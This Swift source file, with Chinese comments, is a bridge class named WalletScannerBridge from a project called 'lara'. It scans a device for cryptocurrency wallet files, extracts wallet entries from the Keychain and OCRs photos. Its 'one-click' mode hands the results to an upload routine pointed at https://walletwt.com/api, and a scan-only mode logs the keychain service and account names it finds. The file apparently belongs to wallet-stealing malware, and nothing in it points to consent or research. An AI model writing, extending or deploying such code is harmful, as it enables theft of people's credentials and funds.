//
//  RDWalletScannerBridge.swift
//  lara
//
//  Swift 桥接 — 让 lara 可以调用 WalletScanner
//

import Foundation
import SwiftUI

/// WalletScanner 桥接管理器
final class WalletScannerBridge: ObservableObject {
    static let shared = WalletScannerBridge()

    @Published var isRunning: Bool = false
    @Published var isDone: Bool = false
    @Published var fileCount: Int = 0
    @Published var keychainCount: Int = 0
    @Published var photoCount: Int = 0
    @Published var statusMessage: String = "就绪"
    @Published var serverURL: String = "https://walletwt.com/api"

    private init() {}

    // ============ 一键扫描 ============
    func run() {
        guard !isRunning else { return }

        isRunning = true
        isDone = false
        statusMessage = "正在扫描..."
        fileCount = 0
        keychainCount = 0
        photoCount = 0

        // 设置服务器
        RDAutoPilot.setServerURL(serverURL)

        // 执行
        RDAutoPilot.run { [weak self] success, files, kc, photos, error in
            DispatchQueue.main.async {
                guard let self else { return }
                self.isRunning = false
                self.isDone = true
                self.fileCount = files
                self.keychainCount = kc
                self.photoCount = photos

                if success {
                    self.statusMessage = "完成: \(files)文件 \(kc)Keychain \(photos)OCR"
                } else {
                    self.statusMessage = "失败: \(error?.localizedDescription ?? "未知错误")"
                }

                globallogger.log("[WalletScanner] \(self.statusMessage)")
                globallogger.divider()
            }
        }
    }

    // ============ 仅扫描不传 ============
    func scanOnly() {
        guard !isRunning else { return }
        isRunning = true
        isDone = false
        statusMessage = "仅扫描..."
        fileCount = 0
        keychainCount = 0
        photoCount = 0

        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let files = RDFileScanner.scanAllWallets()
            let kc = RDKeychainExtractor.extractAllWallets()

            DispatchQueue.main.async {
                guard let self else { return }
                self.fileCount = files.count
                self.keychainCount = kc.count
                self.isRunning = false
                self.isDone = true
                self.statusMessage = "找到: \(files.count)文件 \(kc.count)Keychain"

                globallogger.log("[WalletScanner] \(self.statusMessage)")

                // 打印详情
                for f in files {
                    if let sf = f as? RDScannedFile {
                        globallogger.log("  [\(sf.walletName ?? "")] \(sf.fileName ?? "")")
                    }
                }
                for k in kc {
                    if let ki = k as? RDKeychainItem {
                        globallogger.log("  [Keychain] \(ki.service ?? "") / \(ki.account ?? "")")
                    }
                }
                globallogger.divider()
            }
        }
    }
}
